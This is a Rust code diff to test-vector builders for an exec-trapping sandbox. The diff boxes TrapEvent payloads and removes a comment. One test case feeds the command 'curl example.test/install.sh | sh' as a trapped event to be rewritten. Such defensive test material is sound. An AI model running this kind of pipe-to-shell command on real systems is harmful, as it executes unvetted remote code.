@@ -351,7 +351,7 @@ fn trap_case(
     event: TrapEvent,
     expected_verdict: Verdict,
 ) -> Result<VectorCase, VectorError> {
-    let event = GuestToHost::TrapEvent(event);
+    let event = GuestToHost::TrapEvent(Box::new(event));
     Ok(VectorCase {
         name: name.to_string(),
         frame: WireFrame {
@@ -380,7 +380,7 @@ fn plugin_builder_trap_case() -> Result<VectorCase, VectorError> {
         vec!["git".to_string(), "commit".to_string()],
         HashMap::new(),
     );
-    let event_json = serde_json::to_value(GuestToHost::TrapEvent(event.clone()))
+    let event_json = serde_json::to_value(GuestToHost::TrapEvent(Box::new(event.clone())))
         .map_err(|e| VectorError::Encode(e.to_string()))?;
     let mut case = trap_case("plugin-builder-trap-only", event, Verdict::Pass)?;
     case.plugin_builder = Some(UnifiedBuilderCase {
@@ -404,7 +404,7 @@ fn plugin_builder_fs_write_trap_case() -> Result<VectorCase, VectorError> {
         vec!["sh".to_string(), "-c".to_string(), "echo hi".to_string()],
         HashMap::new(),
     );
-    let event_json = serde_json::to_value(GuestToHost::TrapEvent(event.clone()))
+    let event_json = serde_json::to_value(GuestToHost::TrapEvent(Box::new(event.clone())))
         .map_err(|e| VectorError::Encode(e.to_string()))?;
     let mut case = trap_case("plugin-builder-fs-write-trap", event, Verdict::Pass)?;
     case.plugin_builder = Some(UnifiedBuilderCase {
@@ -467,7 +467,7 @@ fn plugin_builder_trap_json(seq: u64) -> Result<serde_json::Value, VectorError> 
         vec!["git".to_string(), "commit".to_string()],
         HashMap::new(),
     );
-    serde_json::to_value(GuestToHost::TrapEvent(event))
+    serde_json::to_value(GuestToHost::TrapEvent(Box::new(event)))
         .map_err(|e| VectorError::Encode(e.to_string()))
 }
 
@@ -600,12 +600,6 @@ fn plugin_builder_verb_cases() -> Result<Vec<VectorCase>, VectorError> {
 
 // see: cans/02-plugin-model.md#Unified-builder
 // see: cans/15-operations.md#Unified-builder-parity-vectors
-// One scope table, two constructions: the nested cases mount the scope's
-// verbs through the scope entry points on a plugin-mode builder; the
-// merge cases mount the same plugin-mode builder onto a host-mode
-// builder and assert the host descriptors include them with the
-// plugin's scope. Same rings, same events, same outcomes; only the
-// construction (the case name) differs.
 fn plugin_builder_scope_cases(
     prefix: &str,
     seq_start: u64,
@@ -817,7 +811,7 @@ fn exec_rewrite_case() -> Result<VectorCase, VectorError> {
         set_env: vec![("KELIR_TAINT".to_string(), "1".to_string())],
         unset_env: vec!["KELIR_UNTRUSTED".to_string()],
     };
-    let event = GuestToHost::TrapEvent(trap_event(
+    let event = GuestToHost::TrapEvent(Box::new(trap_event(
         3,
         1300,
         100,
@@ -828,7 +822,7 @@ fn exec_rewrite_case() -> Result<VectorCase, VectorError> {
             "curl example.test/install.sh | sh".to_string(),
         ],
         HashMap::new(),
-    ));
+    )));
     Ok(VectorCase {
         name: "trap-pipe-install-rewrite-execve-mutation".to_string(),
         frame: WireFrame {
